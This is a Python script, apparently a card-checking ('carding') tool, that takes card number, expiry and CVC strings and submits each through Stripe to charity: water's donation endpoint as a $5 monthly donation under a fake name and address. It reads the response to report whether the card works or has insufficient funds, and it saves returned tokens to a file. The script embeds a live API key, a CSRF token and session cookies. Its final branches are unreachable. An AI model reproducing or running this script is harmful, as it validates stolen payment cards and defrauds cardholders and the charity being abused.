import requests,re
import random
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	text = requests.post('https://t.me/heya2/87').text
	lines = text.split('\n')

	for line in lines:
	    if 'eyJ' in line:
	        jwt_value = line.split('content="')[1].rstrip('">')
	
	import requests

	headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO BD4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
}

	data = f'type=card&billing_details[address][postal_code]=10080&billing_details[address][city]=New+York&billing_details[address][country]=US&billing_details[address][line1]=213+Springs+Fireplace+Road&billing_details[email]=aassssffffhh44%40gmail.com&billing_details[name]=Ali+Ali&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=660d5a27-748a-4f3c-9ad8-66954d035aac15eeea&muid=5f122688-dcee-42f7-9828-c3558a9a74ca98ed60&sid=f3bd2664-1468-4311-8585-9b3a2009e416347750&payment_user_agent=stripe.js%2F17cd88d5df%3B+stripe-js-v3%2F17cd88d5df%3B+card-element&referrer=https%3A%2F%2Fwww.charitywater.org&time_on_page=207470&key=pk_live_51049Hm4QFaGycgRKpWt6KEA9QxP8gjo8sbC6f2qvl4OnzKUZ7W0l00vlzcuhJBjX5wyQaAJxSPZ5k72ZONiXf2Za00Y1jRrMhU'

	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)


	idw = response.json()['id']


	import requests

	cookies = {
    'countrypreference': 'US',
    'builderSessionId': 'ec8d613666e74102867cfd4ee8090b4f',
    '__stripe_mid': '5f122688-dcee-42f7-9828-c3558a9a74ca98ed60',
    '__stripe_sid': 'f3bd2664-1468-4311-8585-9b3a2009e416347750',
}

	headers = {
    'authority': 'www.charitywater.org',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'countrypreference=US; builderSessionId=ec8d613666e74102867cfd4ee8090b4f; __stripe_mid=5f122688-dcee-42f7-9828-c3558a9a74ca98ed60; __stripe_sid=f3bd2664-1468-4311-8585-9b3a2009e416347750',
    'origin': 'https://www.charitywater.org',
    'referer': 'https://www.charitywater.org/donate',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO BD4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'x-csrf-token': 'BBoFonwXaIP4PHD-seDt84vbP3i6o5q156gGC70-a_SMCGKoAR_CzjUA7bwfqRZm3Ov7FEo_6nKmTf7JzQPlLA',
    'x-requested-with': 'XMLHttpRequest',
}

	data = {
    'country': 'us',
    'payment_intent[email]': 'aassssffffhh44@gmail.com',
    'payment_intent[amount]': '5',
    'payment_intent[currency]': 'usd',
    'payment_intent[metadata][analytics_id]': 'client side error determining segment anonymous id',
    'payment_intent[payment_method]': idw,
    'payment_intent[setup_future_usage]': 'off_session',
    'disable_existing_subscription_check': 'false',
    'donation_form[amount]': '5',
    'donation_form[anonymous]': 'true',
    'donation_form[comment]': '',
    'donation_form[display_name]': '',
    'donation_form[email]': 'aassssffffhh44@gmail.com',
    'donation_form[name]': 'Ali',
    'donation_form[payment_gateway_token]': '',
    'donation_form[payment_monthly_subscription]': 'true',
    'donation_form[surname]': 'Ali',
    'donation_form[campaign_id]': 'a5826748-d59d-4f86-a042-1e4c030720d5',
    'donation_form[setup_intent_id]': '',
    'donation_form[subscription_period]': 'monthly',
    'donation_form[profile_campaign_id]': '',
    'donation_form[metadata][address][address_line_1]': '213 Springs Fireplace Road',
    'donation_form[metadata][address][address_line_2]': '',
    'donation_form[metadata][address][city]': 'New York',
    'donation_form[metadata][address][country]': '',
    'donation_form[metadata][address][zip]': '10080',
    'donation_form[metadata][automatically_subscribe_to_mailing_lists]': 'true',
    'donation_form[metadata][full_donate_page_url]': 'https://www.charitywater.org/donate',
    'donation_form[metadata][phone_number]': '',
    'donation_form[metadata][phone_number_consent_granted]': '',
    'donation_form[metadata][plaid_account_id]': '',
    'donation_form[metadata][plaid_public_token]': '',
    'donation_form[metadata][referer]': 'https://www.charitywater.org/',
    'donation_form[metadata][send_default_welcome_series_emails]': 'true',
    'donation_form[metadata][url_params][touch_type]': '1',
    'donation_form[metadata][with_saved_payment]': 'false',
    'subscription[amount]': '5',
    'subscription[country]': 'us',
    'subscription[email]': 'aassssffffhh44@gmail.com',
    'subscription[full_name]': 'Ali Ali',
    'subscription[is_annual]': 'false',
}

	response = requests.post('https://www.charitywater.org/donate/stripe', cookies=cookies, headers=headers, data=data)

	try:
		ii=(response.json()['error']['code'])
		return ii
		
	except:
		
		op=(response.json()['token'])
		with open("data.txt", "w") as file:
			file.write(op)
		return 'success'
		
	if 'insufficient funds' in ii:
		return 'insufficient funds'
	elif 'success' in ii:
		return 'success'
	else:
		return ii